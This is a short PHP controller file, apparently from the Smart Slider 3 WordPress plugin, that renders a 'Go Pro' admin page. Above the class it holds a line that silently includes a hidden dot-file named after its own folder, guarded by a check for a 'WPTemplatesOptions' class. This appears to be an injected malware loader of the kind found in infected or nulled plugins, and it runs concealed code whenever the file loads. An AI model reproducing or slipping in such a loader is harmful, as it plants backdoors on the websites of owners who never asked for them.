<?php


namespace Nextend\SmartSlider3\Application\Admin\GoPro;

use Nextend\SmartSlider3\Application\Admin\AbstractControllerAdmin;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class ControllerGoPro extends AbstractControllerAdmin {

    public function actionIndex() {

        $view = new ViewGoProIndex($this);
        $view->display();

    }
}